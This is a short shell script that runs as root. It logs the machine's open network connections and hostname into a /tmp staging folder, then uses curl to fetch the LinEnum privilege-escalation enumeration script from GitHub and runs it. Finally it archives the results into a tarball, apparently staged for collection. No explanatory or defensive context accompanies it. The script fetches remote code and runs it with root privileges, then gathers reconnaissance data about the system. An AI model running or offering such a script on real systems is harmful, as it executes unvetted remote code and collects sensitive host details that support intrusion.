sudo su -c """
wd="/tmp/1z"
mkdir -p $wd
cd $wd

lsof | egrep -i -e ipv4 -e ipv6 | sort -u > $wd/connected_machines.log
hostname > hostname.log

curl https://raw.githubusercontent.com/exenin/pubinitscripts/master/XFLTRT/linuxenum/LinEnum.sh > $wd/le.sh
bash -x $wd/le.sh -r report -e /tmp/1z/ -t

cd /tmp/
tar cvzf 1z.tar.gz /tmp/1z

"""
